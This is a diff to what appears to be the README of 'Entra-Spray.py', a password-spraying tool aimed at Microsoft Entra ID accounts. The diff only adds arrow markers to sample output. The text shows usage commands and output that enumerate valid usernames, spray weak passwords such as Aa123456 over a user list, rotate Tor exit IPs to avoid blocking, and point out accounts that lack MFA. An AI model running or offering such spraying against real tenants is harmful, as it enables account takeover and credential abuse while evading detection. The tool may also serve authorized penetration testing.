@@ -55,7 +55,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -check
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor
 
-[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}
+[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}    <--
 [✓] Username: shoshi@entraspraytenant.onmicrosoft.com is exists
 [✓] Username: david@entraspraytenant.onmicrosoft.com is exists
 [✗] Username: dan@mentraspraytenant.onmicrosoft.com not exists
@@ -71,7 +71,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -check -proxytor
 python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456'
 
 [-] Failed to authenticate with shoshi@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
-[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured
+[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
 [-] Failed to authenticate with normuser@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
 [-] Failed to authenticate with shakedwiessman@entraspraytenant.onmicrosoft.com with password Aa123456, didn't check if user exists
 
@@ -84,7 +84,7 @@ python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456'
 python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check
 
 [!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
-[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured
+[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
 [!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
 [!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
 
@@ -101,9 +101,9 @@ The script will check if:
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -proxytor
 
-[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}
+[i] Current TOR IP: {"IsTor":true,"IP":"109.228.160.190"}   <--
 [!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
-[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured
+[✓] User david@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Aa123456, MFA required but not configured   <--
 [!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
 [!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Aa123456
 
@@ -114,11 +114,11 @@ python3 Entra-Spray.py -user list-of-usernames.txt -password 'Aa123456' -check -
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -password 'Bb123456' -check -proxytor
 
-[i] Current TOR IP: {"IsTor":true,"IP":"110.22.66.190"}
+[i] Current TOR IP: {"IsTor":true,"IP":"110.22.66.190"}   <--
 [!] NOT-success: shoshi@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
 [!] NOT-success: david@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
 [!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Bb123456
-[✓] User shakedwiessman@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Bb123456, MFA required
+[✓] User shakedwiessman@entraspraytenant.onmicrosoft.com is exist, and seccessfully logged in with password: Bb123456, MFA required   <--
 
 ----------------------------
  Valid users and successful authentications written to valid-users.txt
@@ -127,8 +127,8 @@ python3 Entra-Spray.py -user list-of-usernames.txt -password 'Bb123456' -check -
 ```python
 python3 Entra-Spray.py -user list-of-usernames.txt -password 'Cc123456' -check -proxytor
 
-[i] Current TOR IP: {"IsTor":true,"IP":"109.172.188.113"}
-[✓] User shoshi@entraspraytenant.onmicrosoft.com is exist, and Password needs updating: Cc123456
+[i] Current TOR IP: {"IsTor":true,"IP":"109.172.188.113"}   <--
+[✓] User shoshi@entraspraytenant.onmicrosoft.com is exist, and Password needs updating: Cc123456   <--
 [!] NOT-success: david@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
 [!] NOT-success: normuser@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
 [!] NOT-success: shakedwiessman@entraspraytenant.onmicrosoft.com exists, Failed to authenticate with password: Cc123456
